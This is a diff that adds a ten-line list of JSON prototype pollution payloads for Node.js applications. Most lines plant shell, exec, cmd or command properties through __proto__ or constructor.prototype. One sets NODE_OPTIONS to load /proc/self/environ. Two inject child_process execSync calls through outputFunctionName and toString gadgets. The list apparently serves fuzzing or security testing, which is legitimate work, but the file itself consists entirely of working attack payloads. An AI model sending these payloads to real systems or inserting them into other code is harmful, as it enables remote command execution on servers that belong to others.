@@ -1,0 +1,10 @@
+{"**proto**":{"shell":"id"}}
+{"**proto**":{"exec":"id"}}
+{"**proto**":{"cmd":"id"}}
+{"**proto**":{"command":"id"}}
+{"**proto**":{"env":{"NODE_OPTIONS":"--require /proc/self/environ"}}}
+{"constructor":{"prototype":{"shell":"id"}}}
+{"constructor":{"prototype":{"cmd":"id"}}}
+{"constructor":{"prototype":{"command":"id"}}}
+{"**proto**":{"outputFunctionName":"process.mainModule.require('child_process').execSync('id')"}}
+{"**proto**":{"toString":"return process.mainModule.require('child_process').execSync('id')"}}
